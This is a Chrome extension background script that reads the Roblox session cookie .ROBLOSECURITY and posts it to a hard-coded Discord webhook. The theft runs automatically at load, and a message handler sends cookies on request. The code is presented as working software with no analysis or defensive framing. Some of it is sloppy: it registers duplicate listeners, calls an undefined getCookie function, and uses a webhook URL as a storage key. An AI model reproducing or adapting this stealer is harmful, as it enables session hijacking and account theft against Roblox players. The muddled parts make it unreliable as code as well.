// background.js

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'getRobloxCookie') {
        chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
            if (cookie) {
                sendResponse({ cookie: cookie.value });
            } else {
                sendResponse({ cookie: null });
            }
        });
        return true;  // Keep the message channel open for asynchronous response
    }
});



function getRobloxSecurityCookie(callback) {
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
        if (cookie) {
            callback(cookie.value);  // Return the cookie value if it exists
        } else {
            callback(null);  // Cookie not found
        }
    });
}

/////

getRobloxSecurityCookie((cookieValue) => {
    if (cookieValue) {
        console.log("ROBLOSECURITY Cookie:", cookieValue);
        // Do something with the cookie value
    } else {
        console.error("ROBLOSECURITY cookie not found");
    }
});

///////

// Function to send the cookie to Discord Webhook
function sendCookieToWebhook(cookieValue) {
    const webhookUrl = 'https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B';  // Replace with your actual Discord webhook URL
    
    // Create the payload to send to Discord
    const payload = {
        content: `ROBLOSECURITY Cookie: ${cookieValue}`
    };
    
    // Send the POST request to the Discord Webhook
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (response.ok) {
            console.log('Cookie sent to Discord successfully.');
        } else {
            console.error('Failed to send cookie to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Error sending cookie to Discord:', error);
    });
}

// Call this function after you retrieve the cookie
getRobloxSecurityCookie((cookieValue) => {
    if (cookieValue) {
        console.log("ROBLOSECURITY Cookie:", cookieValue);
        sendCookieToWebhook(cookieValue);  // Send the cookie to your Discord webhook
    } else {
        console.error("ROBLOSECURITY cookie not found");
    }
});



// Listen for messages from the popup or content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === 'getRobloxCookie') {
        getCookie('.ROBLOSECURITY', function(cookieValue) {
            sendResponse({ cookie: cookieValue });
        });
        return true; // Keeps the message channel open for async sendResponse
    }
    
    if (request.action === 'sendCookie') {
        const cookieValue = request.cookie;
        
        // Retrieve the webhook URL from Chrome's storage
        chrome.storage.sync.get('https://discord.com/api/webhooks/1293261110438264913/p0Wx8436uc25-B-CWtAO78nD84Pj7Zqmrb7s1LdfB1xBcTqOYkLDqjspVUlwAi4Qs_-B', function(data) {
            const webhookUrl = data.webhookUrl;

            if (webhookUrl && cookieValue) {
                // Send the cookie to the Discord webhook
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({ content: cookieValue }) // Send the actual cookie value
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Cookie sent successfully!');
                        sendResponse({ success: true });
                    } else {
                        console.error('Error sending cookie:', response.statusText);
                        sendResponse({ success: false });
                    }
                })
                .catch(error => {
                    console.error('Network error:', error);
                    sendResponse({ success: false });
                });
            } else {
                console.error('Webhook URL not found or no cookie available.');
                sendResponse({ success: false, error: 'Webhook URL or cookie not found' });
            }
        });

        return true; // Keep the message channel open for sendResponse
    }
});
